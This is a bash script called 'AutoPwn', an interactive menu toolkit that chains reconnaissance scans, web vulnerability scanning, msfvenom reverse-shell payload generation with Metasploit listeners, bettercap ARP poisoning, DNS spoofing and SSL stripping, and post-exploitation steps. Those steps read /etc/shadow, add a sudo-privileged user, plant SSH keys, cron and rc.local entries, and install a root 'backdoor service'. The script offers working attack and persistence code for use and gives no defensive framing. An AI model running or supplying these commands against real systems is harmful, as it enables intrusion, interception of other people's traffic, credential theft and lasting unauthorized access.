#!/bin/bash

# AutoPwn - Penetration Testing Toolkit
# Version: 2.0

# Configuration
LOG_DIR="./logs"
REPORT_DIR="./reports"
TMP_DIR="./tmp"
TOOLS_DIR="./tools"
SCANS_DIR="./scans"
LHOST=$(hostname -I | awk '{print $1}')
LPORT="4444"
SESSION_FILE="autopent_session.txt"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Ensure directories exist
mkdir -p {$LOG_DIR,$REPORT_DIR,$TMP_DIR,$TOOLS_DIR,$SCANS_DIR}

# Logging function
log() {
    echo -e "[$(date +'%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_DIR/autopent.log"
}

# Error handling
error() {
    echo -e "${RED}[ERROR]${NC} $1" | tee -a "$LOG_DIR/autopent.log"
    exit 1
}

# Check for root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        error "This script must be run as root. Please use 'sudo'."
    fi
}

# Check for required tools
check_tools() {
    required_tools=("nmap" "nikto" "sqlmap" "gobuster" "msfconsole" "tcpdump" "bettercap" "searchsploit")
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            error "$tool is not installed. Please install it before running this script."
        fi
    done
}

# Save session
save_session() {
    echo "SAVED_SESSION=$(date +'%Y-%m-%d %H:%M:%S')" > "$SESSION_FILE"
    echo "TARGET_IP=$TARGET_IP" >> "$SESSION_FILE"
    echo "TARGET_URL=$TARGET_URL" >> "$SESSION_FILE"
    echo "LHOST=$LHOST" >> "$SESSION_FILE"
    echo "LPORT=$LPORT" >> "$SESSION_FILE"
    log "Session saved to $SESSION_FILE"
}

# Load session
load_session() {
    if [ -f "$SESSION_FILE" ]; then
        source "$SESSION_FILE"
        log "Session loaded from $SESSION_FILE"
        echo -e "${GREEN}Loaded session:${NC}"
        echo "Target IP: $TARGET_IP"
        echo "Target URL: $TARGET_URL"
        echo "LHOST: $LHOST"
        echo "LPORT: $LPORT"
    else
        log "No session file found"
    fi
}

# Reconnaissance menu
recon_menu() {
    while true; do
        echo -e "\n${BLUE}=== RECONNAISSANCE MENU ===${NC}"
        echo "1. Quick Nmap Scan (Top 100 ports)"
        echo "2. Full TCP Port Scan"
        echo "3. UDP Port Scan"
        echo "4. OS and Service Detection"
        echo "5. Vulnerability Scan (NSE scripts)"
        echo "6. DNS Enumeration"
        echo "7. WHOIS Lookup"
        echo "8. Return to Main Menu"
        
        read -p "Select an option: " recon_choice
        
        case $recon_choice in
            1)
                read -p "Enter target IP or range: " TARGET_IP
                log "Starting quick Nmap scan on $TARGET_IP"
                nmap -T4 -F "$TARGET_IP" -oA "$SCANS_DIR/nmap_quick"
                ;;
            2)
                read -p "Enter target IP or range: " TARGET_IP
                log "Starting full TCP port scan on $TARGET_IP"
                nmap -T4 -p- "$TARGET_IP" -oA "$SCANS_DIR/nmap_full_tcp"
                ;;
            3)
                read -p "Enter target IP or range: " TARGET_IP
                log "Starting UDP port scan on $TARGET_IP"
                nmap -T4 -sU --top-ports 100 "$TARGET_IP" -oA "$SCANS_DIR/nmap_udp"
                ;;
            4)
                read -p "Enter target IP or range: " TARGET_IP
                log "Starting OS and service detection scan on $TARGET_IP"
                nmap -T4 -A "$TARGET_IP" -oA "$SCANS_DIR/nmap_os_service"
                ;;
            5)
                read -p "Enter target IP or range: " TARGET_IP
                log "Starting vulnerability scan on $TARGET_IP"
                nmap -T4 --script vuln "$TARGET_IP" -oA "$SCANS_DIR/nmap_vuln"
                ;;
            6)
                read -p "Enter domain name: " DOMAIN
                log "Starting DNS enumeration for $DOMAIN"
                nmap -T4 --script dns-brute "$DOMAIN" -oA "$SCANS_DIR/dns_enum"
                dig ANY "$DOMAIN" +noall +answer >> "$SCANS_DIR/dns_enum.txt"
                host -t mx "$DOMAIN" >> "$SCANS_DIR/dns_enum.txt"
                host -t ns "$DOMAIN" >> "$SCANS_DIR/dns_enum.txt"
                ;;
            7)
                read -p "Enter IP or domain: " WHOIS_TARGET
                log "Starting WHOIS lookup for $WHOIS_TARGET"
                whois "$WHOIS_TARGET" > "$SCANS_DIR/whois_$WHOIS_TARGET.txt"
                ;;
            8)
                return
                ;;
            *)
                error "Invalid option"
                ;;
        esac
    done
}

# Web application assessment menu
web_assessment_menu() {
    while true; do
        echo -e "\n${BLUE}=== WEB APPLICATION ASSESSMENT MENU ===${NC}"
        echo "1. Directory/File Enumeration (Gobuster)"
        echo "2. Web Vulnerability Scan (Nikto)"
        echo "3. SQL Injection Detection (sqlmap)"
        echo "4. CMS Detection"
        echo "5. SSL/TLS Scan"
        echo "6. Return to Main Menu"
        
        read -p "Select an option: " web_choice
        
        case $web_choice in
            1)
                read -p "Enter target URL: " TARGET_URL
                read -p "Use wordlist (leave blank for default): " WORDLIST
                if [ -z "$WORDLIST" ]; then
                    WORDLIST="/usr/share/wordlists/dirb/common.txt"
                fi
                log "Starting directory enumeration on $TARGET_URL"
                gobuster dir -u "$TARGET_URL" -w "$WORDLIST" -o "$SCANS_DIR/gobuster_scan.txt"
                ;;
            2)
                read -p "Enter target URL: " TARGET_URL
                log "Starting Nikto scan on $TARGET_URL"
                nikto -h "$TARGET_URL" -output "$SCANS_DIR/nikto_scan.txt"
                ;;
            3)
                read -p "Enter target URL with parameter: " TARGET_URL
                log "Starting sqlmap scan on $TARGET_URL"
                sqlmap -u "$TARGET_URL" --batch --risk=3 --level=5 --output-dir="$SCANS_DIR/sqlmap"
                ;;
            4)
                read -p "Enter target URL: " TARGET_URL
                log "Starting CMS detection on $TARGET_URL"
                nmap -T4 --script http-cms-detection "$TARGET_URL" -oA "$SCANS_DIR/cms_detection"
                ;;
            5)
                read -p "Enter target domain: " DOMAIN
                log "Starting SSL/TLS scan on $DOMAIN"
                nmap -T4 --script ssl-enum-ciphers -p 443 "$DOMAIN" -oA "$SCANS_DIR/ssl_scan"
                ;;
            6)
                return
                ;;
            *)
                error "Invalid option"
                ;;
        esac
    done
}

# Exploitation menu
exploitation_menu() {
    while true; do
        echo -e "\n${BLUE}=== EXPLOITATION MENU ===${NC}"
        echo "1. Generate Metasploit Payload"
        echo "2. Start Metasploit Listener"
        echo "3. Search Exploits (searchsploit)"
        echo "4. Manual Exploitation Guide"
        echo "5. Return to Main Menu"
        
        read -p "Select an option: " exploit_choice
        
        case $exploit_choice in
            1)
                read -p "Enter payload type (e.g., windows/meterpreter/reverse_tcp): " PAYLOAD
                read -p "Enter output file name: " OUTPUT_FILE
                read -p "Enter LHOST [$LHOST]: " CUSTOM_LHOST
                read -p "Enter LPORT [$LPORT]: " CUSTOM_LPORT
                
                CUSTOM_LHOST=${CUSTOM_LHOST:-$LHOST}
                CUSTOM_LPORT=${CUSTOM_LPORT:-$LPORT}
                
                log "Generating $PAYLOAD payload with LHOST=$CUSTOM_LHOST LPORT=$CUSTOM_LPORT"
                msfvenom -p "$PAYLOAD" LHOST="$CUSTOM_LHOST" LPORT="$CUSTOM_LPORT" -f exe -o "$OUTPUT_FILE"
                ;;
            2)
                read -p "Enter payload type (e.g., windows/meterpreter/reverse_tcp): " PAYLOAD
                read -p "Enter LHOST [$LHOST]: " CUSTOM_LHOST
                read -p "Enter LPORT [$LPORT]: " CUSTOM_LPORT
                
                CUSTOM_LHOST=${CUSTOM_LHOST:-$LHOST}
                CUSTOM_LPORT=${CUSTOM_LPORT:-$LPORT}
                
                log "Starting Metasploit listener for $PAYLOAD on $CUSTOM_LHOST:$CUSTOM_LPORT"
                
                cat > "$TMP_DIR/listener.rc" <<EOL
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $CUSTOM_LHOST
set LPORT $CUSTOM_LPORT
set ExitOnSession false
exploit -j
EOL
                msfconsole -q -r "$TMP_DIR/listener.rc"
                ;;
            3)
                read -p "Enter search term: " SEARCH_TERM
                log "Searching exploits for: $SEARCH_TERM"
                searchsploit "$SEARCH_TERM"
                ;;
            4)
                echo -e "\n${YELLOW}Manual Exploitation Guide:${NC}"
                echo "1. Identify vulnerable service/application"
                echo "2. Search for available exploits (use option 3)"
                echo "3. Research exploit requirements and compatibility"
                echo "4. Download and customize exploit if needed"
                echo "5. Set up any required listeners (use option 2)"
                echo "6. Execute exploit and verify results"
                echo "7. Maintain access if needed"
                ;;
            5)
                return
                ;;
            *)
                error "Invalid option"
                ;;
        esac
    done
}

# MITM menu
mitm_menu() {
    while true; do
        echo -e "\n${BLUE}=== MAN-IN-THE-MIDDLE MENU ===${NC}"
        echo "1. ARP Poisoning"
        echo "2. DNS Spoofing"
        echo "3. SSL Stripping"
        echo "4. Sniff Network Traffic"
        echo "5. Return to Main Menu"
        
        read -p "Select an option: " mitm_choice
        
        case $mitm_choice in
            1)
                read -p "Enter target IP: " TARGET_IP
                read -p "Enter gateway IP: " GATEWAY_IP
                read -p "Enter network interface: " INTERFACE
                
                log "Starting ARP poisoning attack between $TARGET_IP and $GATEWAY_IP"
                
                cat > "$TMP_DIR/bettercap_arp.cap" <<EOL
set arp.spoof.targets $TARGET_IP
set arp.spoof.internal true
set arp.spoof.fullduplex true
arp.spoof on
set net.sniff.local true
net.sniff on
EOL
                bettercap -iface "$INTERFACE" -caplet "$TMP_DIR/bettercap_arp.cap"
                ;;
            2)
                read -p "Enter domain to spoof: " SPOOF_DOMAIN
                read -p "Enter spoof IP: " SPOOF_IP
                read -p "Enter network interface: " INTERFACE
                
                log "Starting DNS spoofing for $SPOOF_DOMAIN to $SPOOF_IP"
                
                cat > "$TMP_DIR/bettercap_dns.cap" <<EOL
set dns.spoof.domains $SPOOF_DOMAIN
set dns.spoof.address $SPOOF_IP
dns.spoof on
set net.sniff.local true
net.sniff on
EOL
                bettercap -iface "$INTERFACE" -caplet "$TMP_DIR/bettercap_dns.cap"
                ;;
            3)
                read -p "Enter network interface: " INTERFACE
                
                log "Starting SSL stripping attack"
                
                cat > "$TMP_DIR/bettercap_ssl.cap" <<EOL
set net.sniff.local true
set net.sniff.output $SCANS_DIR/sslstrip.pcap
set http.proxy.sslstrip true
net.sniff on
http.proxy on
EOL
                bettercap -iface "$INTERFACE" -caplet "$TMP_DIR/bettercap_ssl.cap"
                ;;
            4)
                read -p "Enter network interface: " INTERFACE
                read -p "Enter output file (blank for stdout): " OUTPUT_FILE
                
                log "Starting network traffic sniffing"
                
                if [ -z "$OUTPUT_FILE" ]; then
                    tcpdump -i "$INTERFACE" -A
                else
                    tcpdump -i "$INTERFACE" -w "$SCANS_DIR/$OUTPUT_FILE"
                fi
                ;;
            5)
                return
                ;;
            *)
                error "Invalid option"
                ;;
        esac
    done
}

# Post-exploitation menu
post_exploitation_menu() {
    while true; do
        echo -e "\n${BLUE}=== POST-EXPLOITATION MENU ===${NC}"
        echo "1. System Information Enumeration"
        echo "2. Network Configuration Enumeration"
        echo "3. User Account Enumeration"
        echo "4. File System Enumeration"
        echo "5. Check for Privilege Escalation"
        echo "6. Establish Persistence"
        echo "7. Return to Main Menu"
        
        read -p "Select an option: " post_choice
        
        case $post_choice in
            1)
                echo -e "\n${YELLOW}System Information:${NC}"
                echo "1. uname -a"
                echo "2. cat /etc/*-release"
                echo "3. cat /proc/version"
                echo "4. cat /proc/cpuinfo"
                echo "5. free -m"
                echo "6. df -h"
                echo "7. ps aux"
                echo "8. top -n 1 -b"
                
                read -p "Select command to run: " sys_cmd
                
                case $sys_cmd in
                    1) echo "uname -a"; uname -a ;;
                    2) echo "cat /etc/*-release"; cat /etc/*-release ;;
                    3) echo "cat /proc/version"; cat /proc/version ;;
                    4) echo "cat /proc/cpuinfo"; cat /proc/cpuinfo ;;
                    5) echo "free -m"; free -m ;;
                    6) echo "df -h"; df -h ;;
                    7) echo "ps aux"; ps aux ;;
                    8) echo "top -n 1 -b"; top -n 1 -b ;;
                    *) echo "Invalid option" ;;
                esac
                ;;
            2)
                echo -e "\n${YELLOW}Network Configuration:${NC}"
                echo "1. ifconfig -a / ip a"
                echo "2. route -n"
                echo "3. netstat -tulnpe"
                echo "4. arp -a"
                echo "5. iptables -L -n -v"
                echo "6. cat /etc/resolv.conf"
                echo "7. cat /etc/hosts"
                
                read -p "Select command to run: " net_cmd
                
                case $net_cmd in
                    1) 
                        if command -v ip &> /dev/null; then
                            echo "ip a"; ip a
                        else
                            echo "ifconfig -a"; ifconfig -a
                        fi
                        ;;
                    2) echo "route -n"; route -n ;;
                    3) echo "netstat -tulnpe"; netstat -tulnpe ;;
                    4) echo "arp -a"; arp -a ;;
                    5) echo "iptables -L -n -v"; iptables -L -n -v ;;
                    6) echo "cat /etc/resolv.conf"; cat /etc/resolv.conf ;;
                    7) echo "cat /etc/hosts"; cat /etc/hosts ;;
                    *) echo "Invalid option" ;;
                esac
                ;;
            3)
                echo -e "\n${YELLOW}User Account Enumeration:${NC}"
                echo "1. whoami"
                echo "2. id"
                echo "3. cat /etc/passwd"
                echo "4. cat /etc/shadow"
                echo "5. cat /etc/group"
                echo "6. last"
                echo "7. sudo -l"
                
                read -p "Select command to run: " user_cmd
                
                case $user_cmd in
                    1) echo "whoami"; whoami ;;
                    2) echo "id"; id ;;
                    3) echo "cat /etc/passwd"; cat /etc/passwd ;;
                    4) 
                        if [ -r /etc/shadow ]; then
                            echo "cat /etc/shadow"; cat /etc/shadow
                        else
                            echo "Cannot read /etc/shadow (permission denied)"
                        fi
                        ;;
                    5) echo "cat /etc/group"; cat /etc/group ;;
                    6) echo "last"; last ;;
                    7) echo "sudo -l"; sudo -l ;;
                    *) echo "Invalid option" ;;
                esac
                ;;
            4)
                echo -e "\n${YELLOW}File System Enumeration:${NC}"
                echo "1. find SUID files"
                echo "2. find SGID files"
                echo "3. find world-writable files"
                echo "4. find configuration files"
                echo "5. find log files"
                echo "6. find interesting files (txt, pdf, doc, xls)"
                
                read -p "Select command to run: " fs_cmd
                
                case $fs_cmd in
                    1) 
                        echo "find / -perm -4000 -type f 2>/dev/null"
                        find / -perm -4000 -type f 2>/dev/null
                        ;;
                    2)
                        echo "find / -perm -2000 -type f 2>/dev/null"
                        find / -perm -2000 -type f 2>/dev/null
                        ;;
                    3)
                        echo "find / -perm -o+w -type f 2>/dev/null"
                        find / -perm -o+w -type f 2>/dev/null
                        ;;
                    4)
                        echo "find /etc -type f -name '*.conf' -o -name '*.cfg' 2>/dev/null"
                        find /etc -type f -name '*.conf' -o -name '*.cfg' 2>/dev/null
                        ;;
                    5)
                        echo "find /var/log -type f 2>/dev/null"
                        find /var/log -type f 2>/dev/null
                        ;;
                    6)
                        echo "find / -type f \( -name '*.txt' -o -name '*.pdf' -o -name '*.doc' -o -name '*.xls' \) 2>/dev/null"
                        find / -type f \( -name '*.txt' -o -name '*.pdf' -o -name '*.doc' -o -name '*.xls' \) 2>/dev/null
                        ;;
                    *) echo "Invalid option" ;;
                esac
                ;;
            5)
                echo -e "\n${YELLOW}Privilege Escalation Checks:${NC}"
                echo "1. Kernel exploits"
                echo "2. Sudo misconfiguration"
                echo "3. SUID/SGID binaries"
                echo "4. Cron jobs"
                echo "5. Services"
                echo "6. NFS shares"
                
                read -p "Select check to run: " pe_cmd
                
                case $pe_cmd in
                    1)
                        echo "uname -a"
                        uname -a
                        echo -e "\nSearch for kernel exploits using: searchsploit <kernel version>"
                        ;;
                    2)
                        echo "sudo -l"
                        sudo -l
                        ;;
                    3)
                        echo "find / -perm -4000 -type f 2>/dev/null"
                        find / -perm -4000 -type f 2>/dev/null
                        echo -e "\nfind / -perm -2000 -type f 2>/dev/null"
                        find / -perm -2000 -type f 2>/dev/null
                        ;;
                    4)
                        echo "ls -la /etc/cron*"
                        ls -la /etc/cron*
                        echo -e "\ncrontab -l"
                        crontab -l
                        ;;
                    5)
                        echo "ps aux"
                        ps aux
                        echo -e "\nnetstat -tulnpe"
                        netstat -tulnpe
                        ;;
                    6)
                        echo "cat /etc/exports"
                        cat /etc/exports
                        echo -e "\nshowmount -e localhost"
                        showmount -e localhost 2>/dev/null
                        ;;
                    *) echo "Invalid option" ;;
                esac
                ;;
            6)
                echo -e "\n${YELLOW}Persistence Mechanisms:${NC}"
                echo "1. Add user with root privileges"
                echo "2. Add SSH authorized key"
                echo "3. Add cron job"
                echo "4. Add startup script"
                echo "5. Add backdoor service"
                
                read -p "Select method: " persist_cmd
                
                case $persist_cmd in
                    1)
                        read -p "Enter username: " USERNAME
                        read -p "Enter password: " PASSWORD
                        echo "useradd -m -p $(openssl passwd -1 $PASSWORD) -s /bin/bash -G sudo $USERNAME"
                        useradd -m -p $(openssl passwd -1 $PASSWORD) -s /bin/bash -G sudo $USERNAME
                        ;;
                    2)
                        read -p "Enter public key: " PUBKEY
                        mkdir -p ~/.ssh
                        echo "$PUBKEY" >> ~/.ssh/authorized_keys
                        chmod 600 ~/.ssh/authorized_keys
                        echo "SSH key added to ~/.ssh/authorized_keys"
                        ;;
                    3)
                        read -p "Enter command to run: " CRON_CMD
                        (crontab -l 2>/dev/null; echo "@reboot $CRON_CMD") | crontab -
                        echo "Cron job added"
                        ;;
                    4)
                        read -p "Enter command to run: " STARTUP_CMD
                        echo "$STARTUP_CMD" >> /etc/rc.local
                        chmod +x /etc/rc.local
                        echo "Startup command added to /etc/rc.local"
                        ;;
                    5)
                        read -p "Enter service name: " SERVICE_NAME
                        read -p "Enter command to run: " SERVICE_CMD
                        cat > /etc/systemd/system/$SERVICE_NAME.service <<EOL
[Unit]
Description=$SERVICE_NAME Service

[Service]
ExecStart=$SERVICE_CMD
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOL
                        systemctl enable $SERVICE_NAME
                        systemctl start $SERVICE_NAME
                        echo "Service $SERVICE_NAME created and started"
                        ;;
                    *) echo "Invalid option" ;;
                esac
                ;;
            7)
                return
                ;;
            *)
                error "Invalid option"
                ;;
        esac
    done
}

# Main menu
main_menu() {
    check_root
    check_tools
    load_session
    
    while true; do
        echo -e "\n${BLUE}=== AUTOPENT MAIN MENU ===${NC}"
        echo "1. Reconnaissance"
        echo "2. Web Application Assessment"
        echo "3. Exploitation"
        echo "4. Man-in-the-Middle Attacks"
        echo "5. Post-Exploitation"
        echo "6. Save Session"
        echo "7. Exit"
        
        read -p "Select an option: " main_choice
        
        case $main_choice in
            1) recon_menu ;;
            2) web_assessment_menu ;;
            3) exploitation_menu ;;
            4) mitm_menu ;;
            5) post_exploitation_menu ;;
            6) save_session ;;
            7)
                echo -e "${GREEN}Exiting AutoPwn...${NC}"
                exit 0
                ;;
            *)
                error "Invalid option"
                ;;
        esac
    done
}

# Start the script
clear
echo -e "${RED}"
cat << "EOL"
 
 █████╗ ██╗   ██╗████████╗ ██████╗ ██████╗ ██╗    ██╗███╗   ██╗
██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗██║    ██║████╗  ██║
███████║██║   ██║   ██║   ██║   ██║██████╔╝██║ █╗ ██║██╔██╗ ██║
██╔══██║██║   ██║   ██║   ██║   ██║██╔═══╝ ██║███╗██║██║╚██╗██║
██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║     ╚███╔███╔╝██║ ╚████║
╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
                                                               
EOL
echo -e "${NC}"
echo "Penetration Testing Toolkit"
echo "Version 2.0 | $(date +%Y)"
echo ""

main_menu
